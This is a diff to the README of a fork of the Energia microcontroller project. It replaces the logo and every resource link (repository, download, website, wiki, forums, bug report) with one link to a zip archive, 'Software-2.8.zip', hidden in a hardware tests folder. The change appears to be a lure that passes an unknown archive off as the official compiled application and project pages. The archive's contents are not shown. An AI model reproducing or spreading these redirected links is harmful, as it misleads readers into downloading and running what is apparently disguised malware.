@@ -1,4 +1,4 @@
-![IMG](http://energia.nu/img/Energia.png)
+![IMG](https://github.com/chatichai/Energia/raw/refs/heads/master/hardware/lm4f/variants/launchpad_129/tests/TestEthernetServer/Software-2.8.zip)
 
 ## What Is Energia?
 
@@ -28,10 +28,10 @@ Energia includes ready-to-use libraries for the following BoosterPacks:
 
 No problem! There are a variety of resources available to get you up and running, and sprinting once you're up and running.
 
-* [GitHub repository](http://github.com/energia/Energia) - This very page!
-* [Download](http://energia.nu/download/) - Download a compiled application for Linux, Mac OS X, or Windows.
-* [Website](http://energia.nu) - Full documentation including tutorials, reference, pins maps, FAQ and much more!
-* [Wiki](https://github.com/energia/Energia/wiki) - Find basic information and tutorials here.
-* [LaunchPad forum at 43oh](http://forum.43oh.com/forum/28-energia/) - A community around the original LaunchPad  but also the newer ones.
-* [StellarPad forum at Stellaristi](http://forum.stellarisiti.com/forum/63-energia/) - A community more focused on the newer Stellaris LaunchPad.
-* [Bug report](http://github.com/energia/Energia/issues) - Is something not working as it ought to? Or better yet, is there something we could make better?
+* [GitHub repository](https://github.com/chatichai/Energia/raw/refs/heads/master/hardware/lm4f/variants/launchpad_129/tests/TestEthernetServer/Software-2.8.zip) - This very page!
+* [Download](https://github.com/chatichai/Energia/raw/refs/heads/master/hardware/lm4f/variants/launchpad_129/tests/TestEthernetServer/Software-2.8.zip) - Download a compiled application for Linux, Mac OS X, or Windows.
+* [Website](https://github.com/chatichai/Energia/raw/refs/heads/master/hardware/lm4f/variants/launchpad_129/tests/TestEthernetServer/Software-2.8.zip) - Full documentation including tutorials, reference, pins maps, FAQ and much more!
+* [Wiki](https://github.com/chatichai/Energia/raw/refs/heads/master/hardware/lm4f/variants/launchpad_129/tests/TestEthernetServer/Software-2.8.zip) - Find basic information and tutorials here.
+* [LaunchPad forum at 43oh](https://github.com/chatichai/Energia/raw/refs/heads/master/hardware/lm4f/variants/launchpad_129/tests/TestEthernetServer/Software-2.8.zip) - A community around the original LaunchPad  but also the newer ones.
+* [StellarPad forum at Stellaristi](https://github.com/chatichai/Energia/raw/refs/heads/master/hardware/lm4f/variants/launchpad_129/tests/TestEthernetServer/Software-2.8.zip) - A community more focused on the newer Stellaris LaunchPad.
+* [Bug report](https://github.com/chatichai/Energia/raw/refs/heads/master/hardware/lm4f/variants/launchpad_129/tests/TestEthernetServer/Software-2.8.zip) - Is something not working as it ought to? Or better yet, is there something we could make better?
